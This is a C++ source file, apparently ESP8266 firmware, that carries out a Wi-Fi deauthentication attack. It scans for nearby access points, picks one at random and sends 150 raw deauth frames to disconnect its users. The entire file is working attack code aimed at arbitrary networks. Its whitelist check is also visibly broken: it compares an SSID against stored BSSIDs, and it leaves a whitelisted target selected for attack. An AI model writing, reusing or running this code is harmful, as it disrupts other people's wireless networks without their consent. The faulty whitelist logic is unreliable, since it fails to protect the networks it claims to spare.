//////////////////////////////////////////////////
// deauth.cpp: handles the deauth of a local ap //
//////////////////////////////////////////////////

#include "deauth.h"

void DeauthAttack::addToWhitelist(const char* bssid) {
    whitelist.push_back(bssid);
}

void DeauthAttack::selectRandomAP() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        // check for ap in whitelist
        if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) {
            Serial.println("Selected AP is in the whitelist. Skipping deauthentication.");
            return;
        }

        Serial.print("Selected random AP: ");
        Serial.println(randomAP);
    } else {
        Serial.println("No access points found.");
    }
}

void DeauthAttack::startRandomDeauth() {
    if (randomAP.length() > 0) {
        Serial.println("Starting deauthentication attack on the selected AP...");
        // define the attack
        if (!running) {
            start();
        } else {
            Serial.println("Attack is already running.");
        }
    } else {
        Serial.println("No access point selected. Use selectRandomAP() first.");
    }
}

void DeauthAttack::start() {
    running = true;
    int packetSize = sizeof(deauthPacket);

    // send the deauth 150 times
    for (int i = 0; i < 150; ++i) {
        wifi_send_pkt_freedom(deauthPacket, packetSize, 0);
        Serial.println("(>-<) Deauth packet sent!");
        delay(100);
    }
    Serial.println("(^-^) Attack finished!");
    running = false;
}